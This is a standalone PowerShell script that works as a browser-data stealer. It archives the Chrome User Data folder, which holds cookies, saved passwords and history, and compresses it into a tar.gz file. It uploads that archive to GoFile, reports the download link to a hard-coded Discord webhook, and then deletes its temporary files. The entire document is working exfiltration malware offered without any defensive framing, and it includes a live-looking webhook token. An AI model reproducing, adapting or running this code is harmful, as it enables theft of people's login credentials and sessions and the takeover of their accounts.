# Function to send a message through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )
    $webhook = "https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30"
    $body = @{ content = $message }
    Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
}

# Function to upload a file to GoFile and return the download link
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
    if ($serverResponse.status -ne "ok") {
        Send-DiscordMessage -message "Failed to get server URL."
        return $null
    }
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

    $fileContent = Get-Content $filePath -Raw -Encoding Byte
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
        "Content-Type: application/octet-stream$LF",
        $fileContent,
        "--$boundary--"
    ) -join $LF

    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)

    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
        if ($response.status -eq "ok") {
            return $response.data.downloadPage
        } else {
            Send-DiscordMessage -message "Failed to upload file."
            return $null
        }
    } catch {
        Send-DiscordMessage -message "Error uploading file: $_"
        return $null
    }
}

$chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$tempZipPath = "$env:TEMP\chrome_data.zip"
$tempTarPath = "$env:TEMP\chrome_data.tar"

Compress-Archive -Path $chromeUserDataPath -DestinationPath $tempZipPath -Force

if (Test-Path $tempZipPath) {
    Start-Process -FilePath "tar" -ArgumentList "-a -c -f $tempTarPath.gz --format=gnutar -C $env:TEMP chrome_data.zip" -NoNewWindow -Wait
    if (Test-Path "$tempTarPath.gz") {
        $link = Upload-FileAndGetLink -filePath "$tempTarPath.gz"
        if ($link -ne $null) {
            Send-DiscordMessage -message "Download link: $link"
        } else {
            Send-DiscordMessage -message "Failed to upload .tar.gz file to GoFile."
        }
    } else {
        Send-DiscordMessage -message "Failed to create .tar.gz file."
    }
} else {
    Send-DiscordMessage -message "Failed to create .zip file."
}

Remove-Item $tempZipPath -ErrorAction SilentlyContinue
Remove-Item "$tempTarPath.gz" -ErrorAction SilentlyContinue